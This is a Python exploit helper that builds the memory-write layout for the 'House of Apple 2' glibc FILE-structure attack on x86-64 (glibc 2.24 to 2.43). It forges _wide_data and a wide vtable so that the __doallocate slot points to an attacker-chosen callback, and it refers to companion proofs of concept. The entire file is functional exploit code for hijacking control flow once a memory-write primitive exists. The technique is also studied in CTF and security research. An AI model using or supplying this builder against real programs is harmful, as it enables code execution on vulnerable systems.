"""House of Apple 2 final-sink layout builder for x86-64 glibc.

The builder follows the three executable PoCs in this directory. It creates
field/object images only; the caller supplies the FILE address, write primitive,
and the actual trigger.
"""

from __future__ import annotations

from dataclasses import dataclass


FILE_SIZE = 0xD8
FILE_WIDE_DATA = 0xA0
FILE_VTABLE = FILE_SIZE
FILE_MODE = 0xC0
FILE_FLAGS = 0x00
FILE_READ_BASE = 0x08
FILE_READ_PTR = 0x10
FILE_READ_END = 0x18
FILE_WRITE_BASE = 0x20
FILE_WRITE_PTR = 0x28
FILE_WRITE_END = 0x30
FILE_BUF_BASE = 0x38
FILE_BUF_END = 0x40

WIDE_VTABLE_BY_VERSION = {
    "2.24": 0x130,
    "2.25": 0x130,
    "2.26": 0x130,
    "2.27": 0x130,
    "2.28": 0x130,
    "2.29": 0x130,
    "2.30": 0xF0,
}

DOALLOCATE_SLOT = 0x68
_CLEAR_FOR_WIDE_OVERFLOW = 0x8 | 0x2 | 0x800


@dataclass(frozen=True)
class MemoryWrite:
    """A byte string to place at an absolute address."""

    address: int
    data: bytes
    label: str

    @property
    def end(self) -> int:
        return self.address + len(self.data)


def _check_uint(name: str, value: int, bits: int = 64) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= (1 << bits):
        raise ValueError(f"{name} does not fit in an unsigned {bits}-bit value")


def _ptr(value: int, name: str) -> bytes:
    _check_uint(name, value)
    return value.to_bytes(8, "little")


def _write(address: int, data: bytes, label: str) -> MemoryWrite:
    _check_uint("address", address)
    return MemoryWrite(address, data, label)


def _qword_image(size: int, offset: int, value: int, label: str) -> bytes:
    if offset < 0 or offset + 8 > size:
        raise ValueError(f"{label} does not fit in the generated object")
    image = bytearray(size)
    image[offset : offset + 8] = _ptr(value, label)
    return bytes(image)


def _wide_vtable_offset(version: str) -> int:
    try:
        return WIDE_VTABLE_BY_VERSION[version]
    except KeyError:
        if version in {f"2.{minor}" for minor in range(31, 44)}:
            return 0xE0
        raise ValueError("House of Apple 2 supports glibc 2.24 through 2.43")


def build_house_of_apple2(
    version: str,
    *,
    file_addr: int,
    fake_wide_data_addr: int,
    fake_wide_vtable_addr: int,
    callback_addr: int,
    wfile_jumps_addr: int,
    narrow_buffer_addr: int,
    current_flags: int | None = None,
) -> tuple[MemoryWrite, ...]:
    """Build the minimal Apple2 final-sink object layout for ``version``.

    The returned writes mirror the PoCs:

    * FILE +0xa0 points to fake wide_data.
    * FILE +0xd8 points to the legitimate ``_IO_wfile_jumps`` address supplied
      by the caller.
    * fake wide_data[wide_vtable_offset] points to fake wide_vtable.
    * fake wide_vtable[0x68] points to the desired ``doallocate`` callback.

    The fake objects are zero-filled images, matching the PoCs' ``memset``.
    ``wfile_jumps`` is deliberately an argument: its address is libc/Build-ID
    specific and must be resolved from the target runtime.
    """

    wide_vtable_offset = _wide_vtable_offset(version)
    addresses = {
        "file_addr": file_addr,
        "fake_wide_data_addr": fake_wide_data_addr,
        "fake_wide_vtable_addr": fake_wide_vtable_addr,
        "callback_addr": callback_addr,
        "wfile_jumps_addr": wfile_jumps_addr,
        "narrow_buffer_addr": narrow_buffer_addr,
    }
    for name, value in addresses.items():
        _check_uint(name, value)

    if current_flags is None:
        flags_write = None
    else:
        _check_uint("current_flags", current_flags, 32)
        flags = current_flags & ~_CLEAR_FOR_WIDE_OVERFLOW
        flags_write = _write(
            file_addr + FILE_FLAGS,
            flags.to_bytes(4, "little"),
            "FILE._flags",
        )

    file_writes = [
        _write(file_addr + FILE_WIDE_DATA, _ptr(fake_wide_data_addr, "fake_wide_data_addr"), "FILE._wide_data"),
        _write(file_addr + FILE_VTABLE, _ptr(wfile_jumps_addr, "wfile_jumps_addr"), "FILE.vtable"),
        _write(file_addr + FILE_MODE, (1).to_bytes(4, "little"), "FILE._mode"),
        _write(file_addr + FILE_READ_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_read_base"),
        _write(file_addr + FILE_READ_PTR, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_read_ptr"),
        _write(file_addr + FILE_READ_END, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_read_end"),
        _write(file_addr + FILE_WRITE_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_write_base"),
        _write(file_addr + FILE_WRITE_PTR, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_write_ptr"),
        _write(file_addr + FILE_WRITE_END, _ptr(narrow_buffer_addr + 0x20, "narrow_buffer_end"), "FILE._IO_write_end"),
        _write(file_addr + FILE_BUF_BASE, _ptr(narrow_buffer_addr, "narrow_buffer_addr"), "FILE._IO_buf_base"),
        _write(file_addr + FILE_BUF_END, _ptr(narrow_buffer_addr + 0x20, "narrow_buffer_end"), "FILE._IO_buf_end"),
    ]
    if flags_write is not None:
        file_writes.insert(0, flags_write)

    wide_size = wide_vtable_offset + 8
    wide_vtable_size = DOALLOCATE_SLOT + 8
    return tuple(
        file_writes
        + [
            _write(
                fake_wide_data_addr,
                _qword_image(wide_size, wide_vtable_offset, fake_wide_vtable_addr, "wide_vtable"),
                f"fake wide_data ({version})",
            ),
            _write(
                fake_wide_vtable_addr,
                _qword_image(wide_vtable_size, DOALLOCATE_SLOT, callback_addr, "callback_addr"),
                "fake wide_vtable.__doallocate",
            ),
        ]
    )


